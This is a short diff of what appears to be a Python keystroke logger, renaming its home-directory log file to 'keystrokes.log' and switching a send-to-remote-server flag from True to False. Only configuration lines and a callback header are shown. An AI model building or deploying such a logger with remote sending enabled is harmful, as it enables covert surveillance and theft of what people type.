@@ -12,8 +12,8 @@ MAP = {
   "\r": "\n"
 }
 
-FILE_NAME = "{0}/ksts.log".format(str(Path.home()))
-SEND_TO_REMOTE_SERVER = True
+FILE_NAME = "{0}/keystrokes.log".format(str(Path.home()))
+SEND_TO_REMOTE_SERVER = False
 TERMINATE_KEY = "f7"
 
 def callback(output, is_down, event):
